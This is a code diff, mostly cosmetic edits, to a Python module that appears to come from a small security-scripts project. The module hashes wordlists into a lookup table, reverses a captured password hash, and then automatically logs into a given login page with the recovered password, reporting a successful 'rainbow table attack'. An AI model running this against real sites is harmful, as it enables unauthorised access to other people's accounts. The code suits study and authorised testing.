@@ -6,8 +6,9 @@ from Cyber_Scripts import *
 import hashlib
 import os
 
-
 """
+# old code
+
 def create_table(wordlists, path="/rainbow_tables", file_name="rainbow_table", hash_type="sha256"):
     rt.set_directory(path, full_path=False)
     rt.set_filename(file_name)
@@ -26,6 +27,8 @@ def hash_lookup(hashed, table="rainbow_table"):
     return lookup
 
 """
+
+
 def get_table_path():
     # Define the path to the current Python file
     current_file_path = os.path.abspath(__file__)
@@ -44,9 +47,11 @@ def get_table_path():
     os.makedirs(new_folder_path, exist_ok=True)
     return new_file_path
 
+
 def hash_word(word, hash_type):
     # Check if the specified hash_type is valid
-    valid_hash_types = {'md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'sha3_224', 'sha3_256', 'sha3_384', 'sha3_512'}
+    valid_hash_types = {'md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'sha3_224', 'sha3_256', 'sha3_384',
+                        'sha3_512'}
     if hash_type not in valid_hash_types:
         raise ValueError("Invalid hash type. Supported types: " + ", ".join(valid_hash_types))
 
@@ -62,7 +67,7 @@ def hash_word(word, hash_type):
     return hashed_word
 
 
-def create_table(words_list=None, hash_type="md5", sub_hash = None):
+def create_table(words_list=None, hash_type="md5", sub_hash=None):
     word_txt = ""
     word_hash = ""
 
@@ -87,7 +92,6 @@ def hash_lookup(hashed):
         return False
 
 
-
 def execute(login_page_url, user_name, hashed, table="rainbow_table"):
     # table creation should happen prior to execution ??
 
@@ -96,12 +100,12 @@ def execute(login_page_url, user_name, hashed, table="rainbow_table"):
     # lookup the hash in the table
     # fake_password = hash_lookup(hashed, table)
     fake_password = hash_lookup(hashed)
-    if fake_password == False:
+    if not fake_password:
         print("Match password was not found")
         return False
 
     # lookup successful -> go through login flow
-    # try to login
+    # try to log in
     passed = enter_login_input(login_page_url, user_name, fake_password)
     if passed:
         print("rainbow table attack succeed")
